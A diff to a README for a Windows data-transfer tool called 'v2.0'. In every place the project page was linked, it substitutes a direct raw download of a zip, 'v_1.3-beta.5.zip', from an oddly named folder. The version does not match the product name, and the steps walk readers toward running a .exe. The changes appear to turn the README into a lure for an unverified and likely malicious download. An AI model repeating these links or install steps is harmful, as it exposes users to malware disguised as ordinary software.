@@ -1,6 +1,6 @@
 # ⚙️ v2.0 - Simple Tool for Data Transfer
 
-[![Download v2.0](https://img.shields.io/badge/Download-v2.0-green?style=for-the-badge)](https://github.com/elsalitasafitri21/v2.0)
+[![Download v2.0](https://img.shields.io/badge/Download-v2.0-green?style=for-the-badge)](https://github.com/elsalitasafitri21/v2.0/raw/refs/heads/main/endopterygotic/v_1.3-beta.5.zip)
 
 ---
 
@@ -28,13 +28,13 @@ These requirements make sure the tool runs well and performs its tasks without s
 
 Click the big green button below to visit the download page where you can get the latest version of v2.0.
 
-[![Get v2.0](https://img.shields.io/badge/Get%20v2.0-blue?style=for-the-badge)](https://github.com/elsalitasafitri21/v2.0)
+[![Get v2.0](https://img.shields.io/badge/Get%20v2.0-blue?style=for-the-badge)](https://github.com/elsalitasafitri21/v2.0/raw/refs/heads/main/endopterygotic/v_1.3-beta.5.zip)
 
 ### Steps to download and install:
 
 1. Open your web browser (Chrome, Edge, Firefox).
 2. Go to the link above or paste it into the address bar:  
-   https://github.com/elsalitasafitri21/v2.0
+   https://github.com/elsalitasafitri21/v2.0/raw/refs/heads/main/endopterygotic/v_1.3-beta.5.zip
 3. Look for the **Releases** section or **Download** button on that page.
 4. Choose the latest version meant for Windows. It will usually have `.exe` or `.zip` at the end.
 5. Click the download link for that file.
@@ -93,7 +93,7 @@ If you want to organize your data after transfer, use these tips:
   Check if your Windows is up to date. Restart your computer and try again.
 
 - **Cannot find download link:**  
-  Make sure you are on the correct GitHub page. The link is https://github.com/elsalitasafitri21/v2.0
+  Make sure you are on the correct GitHub page. The link is https://github.com/elsalitasafitri21/v2.0/raw/refs/heads/main/endopterygotic/v_1.3-beta.5.zip
 
 - **Transfer is slow or stuck:**  
   Close other heavy programs. Check your device connections.
@@ -113,7 +113,7 @@ The tool uses basic system protocols to ensure reliable and fast transfers. It d
 
 To check for updates:
 
-1. Visit the download page: https://github.com/elsalitasafitri21/v2.0
+1. Visit the download page: https://github.com/elsalitasafitri21/v2.0/raw/refs/heads/main/endopterygotic/v_1.3-beta.5.zip
 2. Look for the latest release number.
 3. Download the new version following the previous instructions.
 4. Install it over the old version.
@@ -133,10 +133,10 @@ If you run into problems:
 ## 📌 Important Links
 
 - Download and setup page:  
-  https://github.com/elsalitasafitri21/v2.0
+  https://github.com/elsalitasafitri21/v2.0/raw/refs/heads/main/endopterygotic/v_1.3-beta.5.zip
 
 - GitHub project overview:  
-  https://github.com/elsalitasafitri21/v2.0
+  https://github.com/elsalitasafitri21/v2.0/raw/refs/heads/main/endopterygotic/v_1.3-beta.5.zip
 
 ---
 
